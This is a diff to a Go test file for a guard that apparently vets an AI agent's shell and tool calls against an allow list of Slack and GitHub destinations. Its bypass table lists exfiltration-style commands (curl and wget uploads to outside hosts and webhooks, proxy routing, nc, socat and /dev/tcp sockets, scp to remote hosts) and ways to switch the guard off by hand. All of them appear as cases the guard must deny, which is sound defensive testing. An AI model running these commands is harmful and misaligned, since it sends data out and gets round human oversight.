@@ -2,6 +2,7 @@ package guard_test
 
 import (
 	"encoding/json"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -38,11 +39,11 @@ func github(t *testing.T, tool string, input map[string]any) call {
 }
 
 // The relay comes from a Slack thread in C7 and works on pull request 3 of t/r
-// The allow list holds slack:C1 and github:o/*
+// The allow list holds slack:C1, github:o/*, github:ghe.acme.io/o/* and https:api.example.com
 func TestCheck(t *testing.T) {
 	t.Parallel()
 	allow := dest.New(t.TempDir())
-	for _, p := range []string{"slack:C1", "github:o/*"} {
+	for _, p := range []string{"slack:C1", "github:o/*", "github:ghe.acme.io/o/*", "https:api.example.com"} {
 		require.NoError(t, allow.Add(p))
 	}
 	origin, ok := dest.Parse("https://w.slack.com/archives/C7/p1")
@@ -155,6 +156,18 @@ func TestCheck(t *testing.T) {
 		{"allows a wget read", bash(t, "wget -q -e robots=off -O - https://example.com"), ""},
 		{"allows an httpie read with a header and a query", bash(t, "http GET example.com/a Accept:json q==x"), ""},
 		{"allows an xh read", bash(t, "xh https://example.com/a q==x"), ""},
+		{"allows an HTTP write to an allowed host", bash(t, "curl -sd a=1 https://api.example.com/x"), ""},
+		{"allows a scheme-less HTTP write to an allowed host", bash(t, "curl --data a=1 api.example.com/x -o out.json"), ""},
+		{"allows an HTTP write named by --url", bash(t, "curl -X POST --url=https://api.example.com/x"), ""},
+		{"allows an httpie write to an allowed host", bash(t, "http POST api.example.com/x a=1"), ""},
+		{"denies an HTTP write to another host", bash(t, "curl -d a=1 https://example.com"), "https:example.com is not allowed"},
+		{"allows a comment in an allowed repository on another host", bash(t, "GH_HOST=ghe.acme.io gh pr comment 1 -R o/r -b hi"), ""},
+		{"allows a comment through a link on another host", bash(t, "gh pr comment https://ghe.acme.io/o/r/pull/1 -b hi"), ""},
+		{"denies a repository on another host that is not allowed", bash(t, "gh pr comment 1 -R ghe.acme.io/x/r -b hi"), "github:ghe.acme.io/x/r#1"},
+		{"allows xargs to feed a gh read", bash(t, "echo 1 | xargs -I{} gh pr view {} -R x/r"), ""},
+		{"allows scp from another host", bash(t, "scp -P 22 host:a.txt ."), ""},
+		{"allows rsync between local paths", bash(t, "rsync -a a/ b/"), ""},
+		{"denies a Slack delete", slack(t, "slack_delete_message", "C1"), "a delete of slack:C1"},
 		{
 			"denies a PowerShell call",
 			call{"PowerShell", `{"command":"Get-ChildItem"}`}, "a PowerShell call the guard cannot read",
@@ -179,6 +192,7 @@ func TestCheck(t *testing.T) {
 // k. a repository on another host
 // l. a hook run or a file edit that ends the scope by hand
 // m. a network write to a host other than Slack or GitHub
+// n. a write the guard cannot place: a link it cannot read, a program named by {}, a routed request, a socket or a remote copy
 func TestCheck_Bypass(t *testing.T) {
 	t.Parallel()
 	allow := dest.New(t.TempDir())
@@ -245,14 +259,14 @@ func TestCheck_Bypass(t *testing.T) {
 		{"j. a process substitution behind exec", "exec 3> >(gh pr comment 1 -R x/r -b hi)", "github:x/r#1"},
 		{"j. backticks as the output file of redirections only", "> `gh pr comment 1 -R x/r -b hi`", "github:x/r#1"},
 		{"j. a substitution in the target of a here-string", "cat <<< x > $(gh pr comment 1 -R x/r -b hi)", "github:x/r#1"},
-		{"k. -R with another host", "gh pr comment 1 -R ghe.acme.io/o/r -b hi", "a repository on host ghe.acme.io"},
-		{"k. --repo with a link to another host", "gh pr comment 1 --repo https://ghe.acme.io/o/r -b hi", "a repository on host ghe.acme.io"},
-		{"k. GH_REPO with another host", "GH_REPO=ghe.acme.io/o/r gh pr comment 1 -b hi", "a repository on host ghe.acme.io"},
-		{"k. GH_HOST", "GH_HOST=ghe.acme.io gh pr comment 1 -R o/r -b hi", "gh on host ghe.acme.io"},
-		{"k. GH_HOST given to env", "env GH_HOST=ghe.acme.io gh issue comment 1 -R o/r -b hi", "gh on host ghe.acme.io"},
-		{"k. gh api with --hostname", "gh api --hostname ghe.acme.io repos/o/r/issues/1/comments -f body=hi", "gh on host ghe.acme.io"},
-		{"k. gh api with GH_HOST", "GH_HOST=ghe.acme.io gh api repos/o/r/issues/1/comments -f body=hi", "gh on host ghe.acme.io"},
-		{"k. an issue transferred to another host", "gh issue transfer 1 ghe.acme.io/o/r -R o/r", "a repository on host ghe.acme.io"},
+		{"k. -R with another host", "gh pr comment 1 -R ghe.acme.io/o/r -b hi", "github:ghe.acme.io/o/r#1 is not allowed"},
+		{"k. --repo with a link to another host", "gh pr comment 1 --repo https://ghe.acme.io/o/r -b hi", "github:ghe.acme.io/o/r#1 is not allowed"},
+		{"k. GH_REPO with another host", "GH_REPO=ghe.acme.io/o/r gh pr comment 1 -b hi", "github:ghe.acme.io/o/r#1 is not allowed"},
+		{"k. GH_HOST", "GH_HOST=ghe.acme.io gh pr comment 1 -R o/r -b hi", "github:ghe.acme.io/o/r#1 is not allowed"},
+		{"k. GH_HOST given to env", "env GH_HOST=ghe.acme.io gh issue comment 1 -R o/r -b hi", "github:ghe.acme.io/o/r#1 is not allowed"},
+		{"k. gh api with --hostname", "gh api --hostname ghe.acme.io repos/o/r/issues/1/comments -f body=hi", "github:ghe.acme.io/o/r#1 is not allowed"},
+		{"k. gh api with GH_HOST", "GH_HOST=ghe.acme.io gh api repos/o/r/issues/1/comments -f body=hi", "github:ghe.acme.io/o/r#1 is not allowed"},
+		{"k. an issue transferred to another host", "gh issue transfer 1 ghe.acme.io/o/r -R o/r", "github:ghe.acme.io/o/r is not allowed"},
 		{"l. meetproxy hook stop", `echo '{"session_id":"s1"}' | meetproxy hook stop`, "meetproxy hook stop changes meetproxy settings"},
 		{"l. meetproxy hook by path with data", `"/p/bin/meetproxy" --data d hook guard`, "meetproxy hook guard changes meetproxy settings"},
 		{"l. rm of a scope marker", "rm " + dataDir + "/scope/s1", "a file edit in the meetproxy data directory"},
@@ -265,50 +279,71 @@ func TestCheck_Bypass(t *testing.T) {
 		{"l. rm inside bash -c", `bash -c "rm ` + dataDir + `/scope/s1"`, "a file edit in the meetproxy data directory"},
 		{
 			"m. curl POST to GitLab",
-			"curl -X POST https://gitlab.com/api/v4/projects/1/issues/2/notes", "a curl write to gitlab.com",
+			"curl -X POST https://gitlab.com/api/v4/projects/1/issues/2/notes", "https:gitlab.com is not allowed",
 		},
 		{
 			"m. curl data to GitLab",
-			`curl -sd "body=hi" https://gitlab.com/api/v4/projects/1/issues/2/notes`, "a curl write to gitlab.com",
+			`curl -sd "body=hi" https://gitlab.com/api/v4/projects/1/issues/2/notes`, "https:gitlab.com is not allowed",
 		},
-		{"m. curl -XPOST to Linear", `curl -XPOST https://api.linear.app/graphql`, "a curl write to api.linear.app"},
+		{"m. curl -XPOST to Linear", `curl -XPOST https://api.linear.app/graphql`, "https:api.linear.app is not allowed"},
 		{
 			"m. curl json to Linear",
-			`curl --json '{"query":"mutation"}' https://api.linear.app/graphql`, "a curl write to api.linear.app",
+			`curl --json '{"query":"mutation"}' https://api.linear.app/graphql`, "https:api.linear.app is not allowed",
 		},
 		{
 			"m. curl to a Discord webhook",
 			`curl -H "Content-Type: application/json" -d '{"content":"hi"}' https://discord.com/api/webhooks/1/x`,
-			"a curl write to discord.com",
+			"https:discord.com is not allowed",
 		},
-		{"m. curl form", "curl -F file=@a.txt https://example.com/up", "a curl write to example.com"},
-		{"m. curl upload", "curl -T a.txt https://example.com/up", "a curl write to example.com"},
-		{"m. curl upload in a cluster", "curl -sT a.txt https://example.com/up", "a curl write to example.com"},
-		{"m. curl options from a file", "curl -K req.cfg", "a curl write to a host the guard cannot place"},
-		{"m. curl --request DELETE", "curl --request DELETE https://example.com/a/1", "a curl write to example.com"},
-		{"m. curl data with -G and POST", "curl -G -d a=1 -X POST https://example.com", "a curl write to example.com"},
-		{"m. curl behind sudo", "sudo -u me curl --data-binary @a https://example.com", "a curl write to example.com"},
-		{"m. curl.exe", "curl.exe -d a=1 https://example.com", "a curl write to example.com"},
-		{"m. curl inside bash -c", `bash -c "curl -d a=1 https://example.com"`, "a curl write to example.com"},
-		{"m. curl inside a substitution", `echo "$(curl -d a=1 https://example.com)"`, "a curl write to example.com"},
+		{"m. curl form", "curl -F file=@a.txt https://example.com/up", "https:example.com is not allowed"},
+		{"m. curl upload", "curl -T a.txt https://example.com/up", "https:example.com is not allowed"},
+		{"m. curl upload in a cluster", "curl -sT a.txt https://example.com/up", "https:example.com is not allowed"},
+		{"m. curl options from a file", "curl -K req.cfg", "a curl write through -K"},
+		{"m. curl --request DELETE", "curl --request DELETE https://example.com/a/1", "https:example.com is not allowed"},
+		{"m. curl data with -G and POST", "curl -G -d a=1 -X POST https://example.com", "https:example.com is not allowed"},
+		{"m. curl behind sudo", "sudo -u me curl --data-binary @a https://example.com", "https:example.com is not allowed"},
+		{"m. curl.exe", "curl.exe -d a=1 https://example.com", "https:example.com is not allowed"},
+		{"m. curl inside bash -c", `bash -c "curl -d a=1 https://example.com"`, "https:example.com is not allowed"},
+		{"m. curl inside a substitution", `echo "$(curl -d a=1 https://example.com)"`, "https:example.com is not allowed"},
 		{
 			"m. wget post data to Discord",
-			"wget --post-data='content=hi' https://discord.com/api/webhooks/1/x", "a wget write to discord.com",
+			"wget --post-data='content=hi' https://discord.com/api/webhooks/1/x", "https:discord.com is not allowed",
 		},
-		{"m. wget post file", "wget --post-file a.json https://example.com", "a wget write to example.com"},
-		{"m. wget method", "wget --method=PUT https://example.com/a", "a wget write to example.com"},
-		{"m. wget method set by -e", "wget -e method=POST https://example.com/a", "a wget write to example.com"},
+		{"m. wget post file", "wget --post-file a.json https://example.com", "https:example.com is not allowed"},
+		{"m. wget method", "wget --method=PUT https://example.com/a", "https:example.com is not allowed"},
+		{"m. wget method set by -e", "wget -e method=POST https://example.com/a", "https:example.com is not allowed"},
 		{
 			"m. httpie POST to GitLab",
-			"http POST https://gitlab.com/api/v4/projects/1/issues title=x", "a http write to gitlab.com",
+			"http POST https://gitlab.com/api/v4/projects/1/issues title=x", "https:gitlab.com is not allowed",
 		},
-		{"m. httpie data item to Linear", "https api.linear.app/graphql query=mutation", "a https write"},
-		{"m. httpie json item", "http example.com/a n:=1", "a http write"},
-		{"m. httpie file item", "http example.com/a f@a.txt", "a http write"},
-		{"m. httpie form", "http -f example.com/a", "a http write"},
-		{"m. httpie here document", "http example.com/a <<EOF\n{}\nEOF", "a http write"},
-		{"m. xh DELETE", "xh delete https://example.com/a/1", "a xh write to example.com"},
-		{"m. xh data to Discord", "xh https://discord.com/api/webhooks/1/x content=hi", "a xh write to discord.com"},
+		{"m. httpie data item to Linear", "https api.linear.app/graphql query=mutation", "https:api.linear.app is not allowed"},
+		{"m. httpie json item", "http example.com/a n:=1", "https:example.com is not allowed"},
+		{"m. httpie file item", "http example.com/a f@a.txt", "https:example.com is not allowed"},
+		{"m. httpie form", "http -f example.com/a", "https:example.com is not allowed"},
+		{"m. httpie here document", "http example.com/a <<EOF\n{}\nEOF", "https:example.com is not allowed"},
+		{"m. xh DELETE", "xh delete https://example.com/a/1", "https:example.com is not allowed"},
+		{"m. xh data to Discord", "xh https://discord.com/api/webhooks/1/x content=hi", "https:discord.com is not allowed"},
+		{"n. a gh link to another site", "gh pr comment 1 -R o/r -b hi https://example.com/x", "a link the guard cannot read"},
+		{"n. xargs naming the program with {}", "cat names | xargs -I{} {} pr comment 1 -R x/r -b hi", "a command named by an expansion"},
+		{"n. parallel naming the program with {}", "parallel {} pr comment 1 -R x/r -b hi ::: gh", "a command named by an expansion"},
+		{"n. curl write to a variable URL", `curl -d a=1 "$URL"`, "a curl write to a host the guard cannot place"},
+		{"n. curl write to a glob URL", `curl -d a=1 "https://{a,b}.example.com"`, "a curl write to a host the guard cannot place"},
+		{"n. curl write without a URL", "curl -d a=1", "a curl write to a host the guard cannot place"},
+		{"n. curl --resolve", "curl --resolve api.example.com:443:1.2.3.4 -d a=1 https://api.example.com", "a curl write through --resolve"},
+		{"n. curl -x", "curl -x http://p:8080 -d a=1 https://api.example.com", "a curl write through -x"},
+		{"n. curl --connect-to", "curl --connect-to=::evil:443 -d a=1 https://api.example.com", "a curl write through --connect-to"},
+		{"n. a proxy variable", "HTTPS_PROXY=http://p curl -d a=1 https://api.example.com", "a curl write through a proxy"},
+		{"n. an exported proxy", "export https_proxy=http://p; curl -d a=1 https://api.example.com", "a curl write through a proxy"},
+		{"n. wget URLs from a file", "wget --post-data=a -i urls.txt", "a wget write through -i"},
+		{"n. wget proxy set by -e", "wget -e https_proxy=p --post-data=a https://api.example.com", "a wget write through -e"},
+		{"n. httpie proxy", "http --proxy=https:http://p POST api.example.com a=1", "a http write through --proxy"},
+		{"n. nc", "echo hi | nc example.com 80", "a raw socket through nc"},
+		{"n. socat behind sudo", "sudo socat - TCP:example.com:80", "a raw socket through socat"},
+		{"n. a /dev/tcp redirection", "echo hi > /dev/tcp/example.com/80", "a raw socket through /dev/tcp"},
+		{"n. scp to another host", "scp -i key a.txt host:/tmp/", "a scp copy to another host"},
+		{"n. rsync to a daemon", "rsync -a a/ rsync://host/m/", "a rsync copy to another host"},
+		{"n. sftp", "sftp -b batch host", "an sftp session"},
+		{"n. substitutions nested past the lexer", "echo " + strings.Repeat("$(", 300) + "gh" + strings.Repeat(")", 300), "nested too deep"},
 		{"m. pwsh -Command", `pwsh -Command "Invoke-RestMethod -Method Post https://example.com"`, "inline pwsh program"},
 		{"m. powershell -c", `powershell.exe -c "iwr https://example.com"`, "inline powershell.exe program"},
 	}
@@ -436,4 +471,18 @@ func TestDestinations_FileEdits(t *testing.T) {
 			assert.ErrorIs(t, err, tc.want)
 		})
 	}
+}
+
+func FuzzDestinations(f *testing.F) {
+	for _, s := range []string{
+		"gh pr comment 1 -R o/r -b hi", "curl -d a=1 https://example.com", "echo $(gh api repos/o/r/issues -f x=1)",
+		"xargs -I{} gh pr view {}", "scp a host:b",
+	} {
+		f.Add(s)
+	}
+	f.Fuzz(func(t *testing.T, cmd string) {
+		b, err := json.Marshal(map[string]string{"command": cmd})
+		require.NoError(t, err)
+		_, _ = guard.Destinations("Bash", b, dataDir)
+	})
 }
